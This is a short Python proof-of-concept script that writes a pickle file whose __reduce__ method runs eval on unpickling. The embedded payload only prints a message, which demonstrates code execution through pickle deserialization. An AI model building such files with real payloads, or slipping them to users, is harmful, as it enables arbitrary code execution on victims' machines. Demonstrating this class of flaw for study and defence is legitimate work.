# create_malicious_pickle.py
import pickle

# Define a class with potentially malicious behavior
class MaliciousCode:
    def __reduce__(self):
        # Code to execute upon unpickling
        return (eval, ("print('Malicious Code Executed')",))

# Create an instance of the malicious class
malicious_data = MaliciousCode()

# Serialize the malicious object
with open('malicious.pkl', 'wb') as f:
    pickle.dump(malicious_data, f)

print("Malicious pickle file 'malicious.pkl' created.")

